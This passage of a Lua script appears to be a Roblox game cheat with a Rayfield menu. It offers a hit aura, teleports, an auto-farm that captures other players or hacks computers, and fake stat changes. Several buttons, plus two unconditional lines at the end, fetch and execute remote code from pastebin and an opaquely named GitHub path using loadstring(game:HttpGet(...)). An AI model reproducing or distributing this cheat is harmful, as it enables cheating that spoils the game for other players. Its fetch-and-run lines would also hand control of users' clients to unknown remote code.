    if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end
    local myPos = myChar.HumanoidRootPart.Position

    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - myPos).Magnitude
            if dist <= maxDist and (not closestDist or dist < closestDist) then
                closest = plr
                closestDist = dist
            end
        end
    end
    return closest
end

-- Loop do Hit Aura
task.spawn(function()
    while true do
        if hitAuraEnabled and isBeast and HammerEvent then
            local target = GetClosPlr(HIT_AURA_DISTANCE)
            if target and target.Character then
                local torso = target.Character:FindFirstChild("Torso") or target.Character:FindFirstChild("UpperTorso")
                if torso then
                    HammerEvent:FireServer("HammerHit", torso)
                end
            end
        end
        task.wait(0.1)
    end
end)

t4:CreateToggle({
    Name = "Hit Aura",
    CurrentValue = false,
    Flag = "ToggleHitAura",
    Callback = function(Value)
        hitAuraEnabled = Value
        if hitAuraEnabled and isBeast then
            Rayfield:Notify({
                Title = "Auto Hit",
                Content = "🟩 ENABLED",
                Duration = 1.4,
                Image = 4483362458,
            })
        else
            Rayfield:Notify({
                Title = "Auto Hit",
                Content = "🟥 DISABLED",
                Duration = 1.4,
                Image = 4483362458,
            })
        end
    end,
})

-- Toggle for Auto Rope
t4:CreateToggle({
    Name = "Auto Rope",
    CurrentValue = false,
    Flag = "ToggleRope",
    Callback = function(Value)
        autoRopeEnabled = Value
        if autoRopeEnabled and isBeast then
            SetupHammer()
            print("Enabled while beast")
        end
    end,
})

--
ta:CreateSection("Teleports")
ta:CreateButton({
   Name = "Teleport to map [⚠]",
   Callback = function()
        local function findOBSpawnPadInParent()
            for _, model in pairs(game.Workspace:GetChildren()) do
                if model:IsA("Model") then
                    local computerTable = model:FindFirstChild("ComputerTable")
                    if computerTable and computerTable:IsA("Model") then
                        local spawnPad = model:FindFirstChild("OBSpawnPad")
                        if spawnPad and spawnPad:IsA("BasePart") then
                            return spawnPad
                        end
                    end
                end
            end
            return nil
        end
        local spawnPad = findOBSpawnPadInParent()
        if spawnPad then
            local charLocal = getCurrentCharacter()
            if charLocal and charLocal.PrimaryPart then
                charLocal:MoveTo(spawnPad.Position)
            elseif charLocal then
                charLocal:MoveTo(spawnPad.Position)
            end
        else
            Rayfield:Notify({
                Title = "Teleport to map",
                Content = "Spawns not found",
                Duration = 1.5,
                Image = "funnel-x",
            })
        end
   end,
})
-- recursive function to find all models with a given name
local function findAllModelsByName(parent, name)
    local models = {}
    for _, obj in pairs(parent:GetChildren()) do
        if obj.Name == name and obj:IsA("Model") then
            table.insert(models, obj)
        end
        if #obj:GetChildren() > 0 then
            local foundModels = findAllModelsByName(obj, name)
            for _, found in pairs(foundModels) do
                table.insert(models, found)
            end
        end
    end
    return models
end
-- this is an list to avoid repeating recent computers
local recentComputers = {}
-- function that returns a random computer different from the recent ones
local function getRandomComputer()
    local computerModels = findAllModelsByName(workspace, "ComputerTable")
    if #computerModels == 0 then
        return nil
    end
    local validComputers = {}
    for _, computer in pairs(computerModels) do
        if not table.find(recentComputers, computer) then
            table.insert(validComputers, computer)
        end
    end
    if #validComputers == 0 then
        recentComputers = {}
        validComputers = computerModels
    end
    local randomIndex = math.random(1, #validComputers)
    return validComputers[randomIndex]
end

local function isTriggerOccupied(trigger)
    if not trigger then return true end
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - trigger.Position).Magnitude
            if dist < 4 then -- distância pequena para considerar "ocupado"
                return true
            end
        end
    end
    return false
end

local function getAvailableTrigger(computer)
    for i = 1, 3 do
        local trigger = computer:FindFirstChild("ComputerTrigger"..i)
        if trigger and not isTriggerOccupied(trigger) then
            return trigger
        end
    end
    return nil
end
-- tp pc
local function smoothTeleport(rootPart, targetCFrame, duration)
    local steps = 260 -- mais steps = mais suave
    local interval = duration / steps
    local startPos = rootPart.CFrame.Position
    local endPos = targetCFrame.Position

    for i = 1, steps do
        local alpha = i / steps
        local newPos = startPos:Lerp(endPos, alpha)
        rootPart.CFrame = CFrame.new(newPos)
        task.wait(interval)
    end
end

-- ⚡ Botão para teleportar apenas em PCs azuis
ta:CreateButton({
    Name = "Teleport to PC [?]",
    Callback = function()
        local rootPart = getCurrentRootPart()
        if not rootPart then return end

        -- pega todos os PCs azuis
        local bluePCs = {}
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj.Name == "ComputerTable" and obj:IsA("Model") then
                local screen = obj:FindFirstChild("Screen")
                if screen and screen:IsA("BasePart") then
                    local color = screen.Color
                    local r,g,b = math.floor(color.R*255), math.floor(color.G*255), math.floor(color.B*255)
                    if r==13 and g==105 and b==172 then
                        table.insert(bluePCs, obj)
                    end
                end
            end
        end

        -- nenhum PC azul encontrado
        if #bluePCs == 0 then
            Rayfield:Notify({
                Title = "TP to PC",
                Content = "No PCs avaible",
                Duration = 1.5,
                Image = "X",
            })
            return
        end

        -- escolhe um PC azul aleatório
        local chosenComputer = bluePCs[math.random(1, #bluePCs)]
        local trigger = getAvailableTrigger(chosenComputer)

        if trigger then
            local targetCFrame = trigger.CFrame + Vector3.new(0, 3, 0)

            -- teleport seguro via micro-steps
            smoothTeleport(rootPart, targetCFrame, 1.5)

            table.insert(recentComputers, chosenComputer)
            if #recentComputers > 3 then
                table.remove(recentComputers, 1)
            end
        else
            Rayfield:Notify({
                Title = "TP to PC",
                Content = "All triggers busy!",
                Duration = 1.5,
                Image = "funnel-x",
            })
        end
    end,
})
-- end
ta:CreateButton({
   Name = "Teleport to exit doors [?]",
   Callback = function()
        local exitDoorModels = findAllModelsByName(game.Workspace, "ExitDoor")
        if #exitDoorModels > 0 then
            local randomIndex = math.random(1, #exitDoorModels)
            local exitDoor = exitDoorModels[randomIndex]
            local rootPart = getCurrentRootPart()
            if rootPart then
                local pivotCFrame = exitDoor:GetPivot()
                local behindDoorCFrame = pivotCFrame * CFrame.new(0, 0, -5)
                rootPart.CFrame = behindDoorCFrame
            end
        end
   end,
})
--
ta:CreateSection("Auto Farm | Credit: luna")
-- ================= AUTO FARM =================
local autoFarmEnabled = false
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- lista de PCs já hackeados
local usedPCs = {}

-- função para resetar PCs usados (nova partida)
local function resetUsedPCs()
    usedPCs = {}
    print("[AutoFarm] Lista de PCs resetada (nova partida).")
end

-- reset quando o mapa mudar (nova rodada)
local mapVal = game.ReplicatedStorage:WaitForChild("CurrentMap")
mapVal:GetPropertyChangedSignal("Value"):Connect(function()
    resetUsedPCs()
end)

-- função para checar se todos já foram capturados
local function allPlayersCaptured()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr:FindFirstChild("TempPlayerStatsModule") then
            local captured = plr.TempPlayerStatsModule:FindFirstChild("Captured")
            if captured and captured.Value == false then
                return false
            end
        end
    end
    return true
end

-- pega PCs azuis não usados
local function getAvailableBluePCs()
    local blue = {}
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj.Name == "ComputerTable" and obj:IsA("Model") and not table.find(usedPCs, obj) then
            local screen = obj:FindFirstChild("Screen")
            if screen and screen:IsA("BasePart") then
                local color = screen.Color
                local r,g,b = math.floor(color.R*255), math.floor(color.G*255), math.floor(color.B*255)
                if r==13 and g==105 and b==172 then
                    table.insert(blue, obj)
                end
            end
        end
    end
    return blue
end

-- pega uma exit aleatória
local function getRandomExit()
    local exits = findAllModelsByName(workspace, "ExitDoor")
    if #exits > 0 then
        return exits[math.random(1, #exits)]
    end
    return nil
end

-- pega pod aleatório
local function getFreezePod()
    local pods = findAllModelsByName(workspace, "FreezePod")
    if #pods > 0 then
        return pods[math.random(1, #pods)]
    end
    return nil
end

ta:CreateToggle({
    Name = "Auto Farm",
    CurrentValue = false,
    Flag = "ToggleAutoFarm",
    Callback = function(Value)
        autoFarmEnabled = Value
        if Value then
            resetUsedPCs()
            task.spawn(function()
                Rayfield:Notify({
                    Title = "Auto Farm",
                    Content = "Initiated 🟩",
                    Duration = 1.4,
                    Image = "calendar-sync",
                })
                while autoFarmEnabled do
                    local stats = LocalPlayer:FindFirstChild("TempPlayerStatsModule")
                    if not stats then break end
                    local isBeast = stats:FindFirstChild("IsBeast") and stats.IsBeast.Value

                    if not isBeast then
                        -- ================= SURVIVOR =================
                        _G.InputActionEnabled = true -- Auto Interact
                        _G.AutomaticHackingEnabled = true -- Anti PC Error
                        print("[AutoFarm] Player is survivor")

                        local rootPart = getCurrentRootPart()
                        if rootPart then
                            local bluePCs = getAvailableBluePCs()
                            if #bluePCs > 0 then
                                local chosenPC = bluePCs[math.random(1, #bluePCs)]
                                local trigger = getAvailableTrigger(chosenPC)
                                if trigger then
                                    print("[AutoFarm] Going forward")
                                    smoothTeleport(rootPart, trigger.CFrame + Vector3.new(0,3,0), 1.5)

                                    -- esperar tela mudar pra verde
                                    local screen = chosenPC:FindFirstChild("Screen")
                                    if screen then
                                        print("[AutoFarm] Hacking PC...")
                                        repeat
                                            task.wait(1)
                                            local color = screen.Color
                                            local r,g,b = math.floor(color.R*255), math.floor(color.G*255), math.floor(color.B*255)
                                            if not (r==13 and g==105 and b==172) then
                                                print("[AutoFarm] PC concluído! Adicionando à lista de usados.")
                                                table.insert(usedPCs, chosenPC)
                                                break
                                            end
                                        until not autoFarmEnabled or not screen.Parent
                                    end
                                end
                            else
                                local exit = getRandomExit()
                                if exit then
                                    print("[AutoFarm] no avaible pcs, going to exit door")
                                    local pivot = exit:GetPivot()
                                    rootPart.CFrame = pivot * CFrame.new(0,0,-5)
                                end
                            end
                        end

                    else
                        -- ================= BEAST =================
                        print("[AutoFarm] Player is beast.")
                        local carried = LocalPlayer:FindFirstChild("CarriedTorso")
                        if carried and carried.Value ~= nil then
                            print("[AutoFarm] Already carrying")
                            repeat task.wait(0.5) until carried.Value == nil or not autoFarmEnabled
                        end

                        for _, plr in pairs(Players:GetPlayers()) do
                            if not autoFarmEnabled then break end
                            if plr ~= LocalPlayer and plr.Character and plr:FindFirstChild("TempPlayerStatsModule") then
                                if not plr.TempPlayerStatsModule.Captured.Value then
                                    local rootPart = getCurrentRootPart()
                                    local targetRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                                    if rootPart and targetRoot then
                                        print("[AutoFarm] going to "..plr.Name)
                                        rootPart.CFrame = targetRoot.CFrame + Vector3.new(0,0,2)
                                        task.wait(0.3)
                                    end

                                    -- Auto Hit / Auto Rope
                                    forceBeastHitEnabled = true
                                    autoRopeEnabled = true

                                    task.wait(0.7)

                                    -- levar para o pod
                                    local pod = getFreezePod()
                                    if pod and rootPart then
                                        rootPart.CFrame = pod:GetPivot() + Vector3.new(0,3,0)
                                    end

                                    _G.InputActionEnabled = true -- Auto Interact
                                    task.wait(1)
                                end
                            end
                        end
                    end

                    if allPlayersCaptured() then
                        autoFarmEnabled = false
                        Rayfield:Notify({
                            Title = "Auto Farm",
                            Content = "Everyone is captured 🟩",
                            Duration = 1.4,
                            Image = "bomb",
                        })
                        break
                    end
                    task.wait(1)
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Farm",
                Content = "Stopped 🟥",
                Duration = 1.4,
                Image = "circle-pause",
            })
        end
    end,
})
--
t5:CreateSection("Other")
t5:CreateButton({
   Name = "Spectate Players (Tab to toggle)",
   Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/gjTkX8rc"))()
   end,
})
t5:CreateButton({
   Name = "Remote audio control",
   Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/3dWP6BW4"))()
   end,
})
t5:CreateSection("Visual scripts")
t5:CreateButton({
    Name = ">Get BeastChance",
    Callback = function()
            while task.wait() do
                y.SavedPlayerStatsModule:WaitForChild("BeastChance").Value = math.huge
            end
    end,
})
t5:CreateButton({
    Name = ">Get Inf. Credits",
    Callback = function()
            y.SavedPlayerStatsModule:WaitForChild("Credits").Value = math.huge
    end,
})
t5:CreateButton({
    Name = ">Get Level (WIP)",
    Callback = function()
            local g = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.PlayerNamesFrame
            y.SavedPlayerStatsModule:WaitForChild("Level").Value = 1000
            g:WaitForChild(y.Name.."PlayerFrame").LevelLabel.Text = y.SavedPlayerStatsModule.Level.Value
    end,
})

Rayfield:LoadConfiguration()

loadstring(game:HttpGet("https://pastebin.com/raw/UjVjsnQC"))()
--okollloo
loadstring(game:HttpGet("https://raw.githubusercontent.com/dirsks/dirsblox/refs/heads/main/recovery/static/crsd1/md5.luau"))()








































